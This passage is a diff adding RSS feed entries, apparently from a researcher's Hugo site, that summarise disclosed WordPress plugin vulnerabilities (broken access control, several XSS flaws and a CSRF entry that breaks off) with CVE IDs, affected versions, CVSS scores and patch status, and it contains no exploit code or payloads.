+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Broken Access Control&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--broken-access-control&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--broken-access-control&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Users can access pages or perform actions they shouldn&amp;rsquo;t be allowed to, like viewing other people&amp;rsquo;s data.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress WordPress Console Plugin &amp;lt;= 0.3.9 is vulnerable to Broken Access Control&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 0.3.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 3.7&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Broken Access Control:&lt;/strong&gt; Users can access pages or perform actions they shouldn&amp;rsquo;t be allowed to, like viewing other people&amp;rsquo;s data.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;WordPress Console&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 0.3.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A5: Broken Access Control&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Broken Access Control&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-28168&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-28168&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;3.7&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Unauthenticated&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;baf6147603ae&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;14 Mar, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;2 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-30477</title>
+      <link>http://localhost:1313/docs/07_research/12-cve-2023-30477/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/12-cve-2023-30477/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Scripting (XSS)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-scripting-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-scripting-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress AFFILIATE Solution Plugin &amp;lt;= 1.0 is vulnerable to Cross Site Scripting (XSS)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.0&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Scripting (XSS):&lt;/strong&gt; Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;AFFILIATE Solution&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.0&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A7: Cross-Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-30477&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-30477&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Administrator&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;467044623c07&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;13 Apr, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;13 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-30754</title>
+      <link>http://localhost:1313/docs/07_research/11-cve-2023-30754/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/11-cve-2023-30754/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Scripting (XSS)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-scripting-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-scripting-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress AdFoxly – Ad Manager, AdSense Ads &amp;amp; Ads.txt Plugin &amp;lt;= 1.8.5 is vulnerable to a high priority Cross Site Scripting (XSS)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.8.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 7.1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Scripting (XSS):&lt;/strong&gt; Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;AdFoxly – Ad Manager, AdSense Ads &amp;amp; Ads.txt&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.8.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available (Patchstack mitigation rule issued)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A7: Cross-Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-30754&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-30754&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🔴High&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;7.1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Unauthenticated&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;18d5dd5b8583&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;14 Apr, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;12 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-33208</title>
+      <link>http://localhost:1313/docs/07_research/08-cve-2023-33208/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/08-cve-2023-33208/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Scripting (XSS)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-scripting-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-scripting-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress Cookie Monster Plugin &amp;lt;= 1.51 is vulnerable to Cross Site Scripting (XSS)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.51&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Scripting (XSS):&lt;/strong&gt; Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;Cookie Monster&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.51&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A7: Cross-Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-33208&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-33208&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Administrator&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;aa59c76bd6cc&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;18 May, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;31 Jan, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-37992</title>
+      <link>http://localhost:1313/docs/07_research/07-cve-2023-37992/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/07-cve-2023-37992/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Request Forgery (CSRF)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-request-forgery-csrf&#34;&gt;&lt;/span&gt;
